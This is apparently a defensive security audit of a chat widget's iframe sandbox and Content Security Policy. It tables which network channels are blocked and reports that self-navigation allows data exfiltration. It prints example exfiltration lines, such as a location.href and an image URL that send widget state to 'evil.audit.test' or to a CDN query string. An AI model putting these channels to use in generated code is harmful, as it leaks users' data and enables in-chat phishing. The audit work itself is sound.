# Widget CSP resource and network boundary audit

Defensive audit for [#19](https://github.com/dreamfarer-space/deepseek-harness-intelligent-ui/issues/19).
It records what the sandbox actually enforces today, which grants are wider than
they need to be, and the one channel that turned out to be exploitable. Nothing
here is a claimed CVE, and no user data is known to have leaked.

Measurements come from `scripts/security/audit.mjs`, which renders the real
`buildFrameDocument()` output in Chrome inside a real
`sandbox="allow-scripts allow-forms"` iframe and records every request the
browser attempts. It is a regression test, not a one-off: `npm run e2e:security`.

## What `allowNetwork=false` guarantees

`connect-src 'none'` is only the script-visible network. The full set of
directives is what decides reachability:

| Channel | Directive that governs it | `allowNetwork=false` |
|---|---|---|
| `fetch`, XHR, WebSocket, `EventSource`, `sendBeacon`, `<a ping>` | `connect-src` | blocked |
| `<img>` (incl. `srcset`, CSS `background`, SVG `<image>`) | `img-src` | **allowed to the CDN allowlist** |
| `<script src>`, `<link rel=stylesheet>`, `@import` | `script-src` / `style-src` | **allowed to the CDN allowlist** |
| `@font-face`, `document.fonts.load` | `font-src` | **allowed to the CDN allowlist** |
| `<video>`, `<audio>`, `media` | `media-src` | **allowed to the CDN allowlist** |
| `<iframe>`, `<object>`, `<embed>`, `<link rel=prefetch>` | `default-src 'none'` | blocked |
| Form submission | `form-action 'none'` | blocked |
| File download (Blob URL or attachment response) | iframe sandbox (no `allow-downloads`) | file download blocked; a cross-origin link can still issue a self-navigation request |
| `window.open`, `target=_blank` | iframe sandbox (no `allow-popups`) | blocked |
| Top-level navigation (`top.location`) | iframe sandbox (no `allow-top-navigation`) | blocked by the sandbox |
| **Self-navigation (`location.href`, `location.replace`)** | **nothing** | **allowed** — see the finding below |
| `mailto:` / `tel:` links | nothing | allowed, but the user sees the handoff |

So `allowNetwork=false` means *no script-readable network access*. It does not
mean "no bytes leave the frame": any element whose directive carries a CDN
origin can still issue a request to that origin, and the URL is fully
attacker-chosen, path and query included. This implementation's `safeOrigins()`
emits origin-only sources. CSP itself supports path components, but ignores
queries and skips path matching after redirects. A permitted path prefix can
also carry data in its suffix. Neither an origin nor a path allowlist is a
complete data-loss boundary.

Measured, with `cdn: ['https://cdn.audit.test']` and `allowNetwork: false`:

- `new Image().src = 'https://cdn.audit.test/pixel.png?leak=<widget data>'` → request sent.
- `<script src='https://cdn.audit.test/x?leak=…'>`, `<link rel=stylesheet>`, `@font-face`
  → requests sent. None of these need a successful response; `onerror` is enough.
- The same URLs against `https://evil.audit.test` → all blocked. The allowlist
  does hold; only the allowlisted origins are reachable.

Consequences worth documenting rather than "fixing": an allowlisted CDN sees
whatever a widget puts in a resource URL. The origin allowlist is a
*reputation* boundary (these hosts already receive widget traffic), not a
*data-loss* boundary. Operators who want to block external resource requests can set
`cdnAllowlist: []` (the offline bundle already forces this); with an empty
allowlist every resource directive collapses to `data:`/`blob:`/`'none'` and
external resource loads are blocked. Self-navigation remains possible and can
send data in its initial navigation URL; this is not a hard egress boundary.

## The finding: self-navigation is not contained

A CSP `navigate-to` directive was removed from the specification and never
shipped, so no `default-src`/`frame-src`/`form-action` value blocks a frame
navigating **itself**. The iframe sandbox does not block it either: it only
withholds top-level navigation. Measured:

```
widget:  location.href = 'https://evil.audit.test/steal?payload=' + encodeURIComponent(state)
result:  "document GET https://evil.audit.test/steal?payload=SENSITIVE-WIDGET-STATE"
```

That is an unrestricted one-way exfiltration channel — no CDN allowlist, no
`connect-src`, no `allowNetwork` involvement — available in the default,
strictest configuration.

It is worse than a single request, because the `WindowProxy` survives the
navigation. Before this fix, `WidgetFrame.post()` used
`contentWindow.postMessage(msg, '*')`, and after the widget navigates away that
`contentWindow` is the foreign document:

```
host:  f.contentWindow.postMessage({ type:'rpc-result', id, ok:true,
                                     value:{ controlled:'CONTROLLED-DATA-VALUE' } }, '*')
evil:  received ["…\"value\":{\"controlled\":\"CONTROLLED-DATA-VALUE\"}…"]
```

The host also renders the foreign page inside the widget's card, under the
widget's title, which makes a convincing phishing surface: a 800×500 frame
inside a trusted chat that says "Sign in to continue".

Verified non-issues in this area: the frame token does not have to be guessed
because the host volunteers the data; `postMessage(…, 'null')` is rejected by
the browser as an invalid target origin, so an opaque origin *cannot* be a
precise target; and the host cannot inspect the frame (every cross-origin read
throws `SecurityError`), so the host must rely on the message channel and iframe lifecycle events.

### Document-bound channel and delayed-load limit

The bootstrap creates a `MessageChannel` and transfers its host endpoint in a
single `connect` message before generated code runs. The host checks source,
fresh document token and the single transferred port, accepts it only once,
and sends **all** later data on that port. It never sends a credential, port,
HTML, theme or RPC result back through the window. Frame messages also use the
port; token-bearing window messages cannot invoke host RPCs.

This direction of transfer matters: sending a host-created port after `ready`
would still race navigation of the same `WindowProxy`. The frame-created port
belongs to the original document; navigation cannot make the replacement
inherit it. The bootstrap closes it on `pagehide`. Host cleanup also closes it
on rebuild, unmount or containment. Pending RPC completions capture their source
port and cannot reply through a newer document's port.

A later iframe `load` still removes the foreign UI and displays the notice.
**It is not a timely security boundary:** an unfinished HTML response or image
can defer `load` indefinitely, and navigation before the initial srcdoc load
may consume the first-load allowance. A foreign page can therefore remain
visible until a later load; the document-bound channel prevents it receiving
additional host data during that interval. This does not prevent the original
widget from sending data it already holds in a navigation URL or an allowed
resource URL.

A post-load liveness ping cannot solve a never-fired load event. It is not used
as the data boundary. `document.open()`/`write()` replacement is also removed
on its later load; there is no supported widget contract for replacing the
bootstrap's document.

## Why the rest of the CSP is right

`data:` in image, font and media sources supports inline visualizations,
embedded fonts and media without remote hosts. Image/media `blob:` supports
locally generated canvas captures and audio/video object URLs. These grants
permit local resource bytes; they do not add remote origins.

- `default-src 'none'` closes `frame-src`, `object-src`, `manifest-src`,
  `child-src` and prefetch. Confirmed blocked.
- `base-uri 'none'` and `form-action 'none'` are both exercised and effective.
- `connect-src 'none'` blocks fetch/XHR/WebSocket/`EventSource`/`sendBeacon`/
  `<a ping>` while leaving a readable error, and a nested blob worker inherits it
  (`fetch` → `TypeError`, `importScripts` → `NetworkError`).
- Injecting a second, permissive `<meta http-equiv=Content-Security-Policy>`
  and removing the original meta at runtime both leave the policy in force: a
  delivered CSP meta cannot be relaxed afterwards.
- The opaque origin holds: `parent.document`, `parent.localStorage`,
  `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB`, `caches`
  all raise `SecurityError`; `window.origin === 'null'`; `document.referrer`
  is `''` under `referrerpolicy="no-referrer"`; `getUserMedia` raises
  `SecurityError` and geolocation is denied.
- Execution grants that are *needed*: `'unsafe-inline'` for the bootstrap and
  the widget payload, `'unsafe-eval'` for `run()`'s indirect `eval` of
  `jsFunctions`/`jsExpressions`, and `blob:` for the offline import map. None of
  these can be dropped without changing the product, and none of them widens
  what the frame can reach; they are execution permissions, not reach.
- `worker-src blob:` **is** needed: `canvas-confetti`, one of the advertised bare
  imports, runs its default `useWorker: true` path in a blob Worker. Verified
  that such a worker inherits both the frame's CSP (`fetch` → `TypeError`,
  `importScripts` → `NetworkError`) and its opaque origin (`self.origin === 'null'`),
  so the grant adds no reach — it only lets the documented library keep working.
  Dropping it makes `new Worker(blobURL)` fail with an `error` event.

## Plan

1. **Bind communication to the original document.** Use the transferred
   `MessagePort` for all traffic. Rotate credentials on every document rebuild,
   including reloads and policy-only changes that previously emitted identical
   srcdoc. Reset lifecycle in `useLayoutEffect` before any new load task. Reject
   duplicate handshakes and old-port messages; async replies retain their
   original port. A later load removes foreign UI, subject to the delay above.
   Streaming morphs, finalization, theme updates and ordinary DOM work stay on
   one document and keep the same channel.
2. **Keep `worker-src blob:` and record why** (canvas-confetti needs it; it adds
   no reach). No other grant can be removed without changing the product.
3. **Automate the matrix.** `scripts/security/audit.mjs` asserts every row of
   resource/network matrix. `scripts/security/containment.mjs` bundles the real
   React `WidgetFrame` and tests normal streaming, finalization, theme, three
   rebuild types, document rewriting and a foreign document holding an image
   open. It checks no host data arrives while load is delayed, verifies its
   receiver with a positive control, then releases the image and asserts removal.
   The suites run in CI next to the other browser checks.
4. **Document the boundary.** This file, plus the security sections of both
   READMEs, so `allowNetwork=false` is not read as "no external resource
   requests".
5. **Not done here, worth a follow-up issue.** A per-widget "no external
   resources" switch would need a second policy field and a UI surface; the
   current `cdnAllowlist: []` already expresses it for a whole deployment.

## Risk assessment

- Severity of the navigation finding: medium. It needs a widget whose code
  navigates its own frame, which today means model-generated (or model-tricked)
  script, not a malicious dependency. The payoff is one-way exfiltration of
  whatever the widget already holds plus host-supplied RPC results, and a
  same-origin-looking phishing page inside the chat.
- Not a same-origin break: the foreign document cannot read host storage, and
  the opaque origin still denies everything the frame previously could not do.
- Compatibility: the channel bootstrap is internal; public Bridge/UI APIs stay unchanged. All
  existing E2E scenarios, theme updates, streaming morphs and state persistence
  stay on the same-document path and are unaffected, and no CSP directive
  changed, so CDN loading behaves exactly as before.
- No grant was removed in the end. `worker-src blob:` looked droppable until
  `canvas-confetti` turned out to need it; the execution grants are all load-
  bearing. What changed is containment, not the permission set — worth stating
  plainly so a future reader does not assume the CSP was narrowed.

## Reproducing

```sh
npm run e2e:security     # Chrome required, like the other browser suites
```

The script prints one line per channel and fails on any mismatch with the table
above.

The suite is not proof that all external egress is blocked. The self-navigation
request and allowlisted resource URL cases deliberately demonstrate remaining
egress. The top-level-navigation check asserts both the actual attempted
request list and unchanged host URL, rather than an unconditional pass.

Popup, top-level navigation, form submission and downloads use separate fresh
documents. The form test requires both a `form-action` CSP violation and no
outbound request. Downloads are measured with Chrome's `downloadWillBegin`
events, with an unsandboxed Blob download as a positive control; sandboxed Blob
and attachment downloads must not start. The attachment URL is still requested:
cross-origin `download` attributes can be ignored and the link can navigate its
own frame. That request is not a form submission and is not blocked by
`form-action` or the download restriction.

Current validation for the review fix: 402 unit tests, 39/39 Chrome security
checks, the real-browser controlled action regressions, typecheck, release
checks and package-content checks. The browser checks exercise the production
component plus the exact `buildFrameDocument()` output, rather than copying its
guard. This records local validation, not completion of the full CI matrix.
